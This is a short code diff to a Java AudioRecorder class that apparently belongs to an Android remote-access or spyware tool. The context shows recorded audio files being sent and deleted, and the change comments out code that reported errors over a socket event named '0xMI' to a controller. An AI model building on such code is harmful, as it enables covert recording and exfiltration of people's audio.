@@ -120,11 +120,11 @@ public  class AudioRecorder {
                 sendFileAndDelete(audiFile);
                 }
                 catch(Exception e){
-            JSONObject object = new JSONObject();
-            object.put("file",true);
-            object.put("name","true");
-            object.put("buffer" , e.getMessage());
-            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
+            //      JSONObject object = new JSONObject();
+            //      object.put("file",true);
+            // object.put("name","true");
+            // object.put("buffer" , e.getMessage());
+            // IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
                 }
                 
             }
